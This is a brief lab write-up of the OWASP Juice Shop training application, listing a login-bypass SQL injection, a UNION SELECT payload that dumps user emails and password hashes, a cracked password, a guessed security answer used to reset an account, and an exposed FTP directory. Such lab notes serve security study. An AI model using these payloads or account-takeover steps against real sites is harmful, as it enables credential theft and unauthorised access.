# OWASP JUICE SHOP

## BASIC INFO
```
export IP=10.10.23.156
```

## INJECTION

> - **SQL Injection on admin account**
> On the email field `something' OR 1=1 --`

> - **SQL Injection on /rest/product/search?q=something**
> `q=something')) UNION ALL SELECT NULL,email,password,NULL,NULL,NULL,NULL,NULL from users--`
> Crack the hashes
>> Jim's password = ncc-1701

## BROKEN AUTHENTICATION

> - **reset Jim's password**
> Looking through the comments we can see Jim's replied about star fleet
> on his shirt and replicator. Seems like he is James T. Kirk
> and he has a brother named George Samuel Kirk
>> Answer to secret question = Samuel

## SENSITIVE DATA EXPOSURE
> Looking on the link to terms of use
>
> http://10.10.23.156/ftp/legal.md?md_debug=true
>
>Then follow it to
>http://10.10.23.156/ftp
>> acquisition.md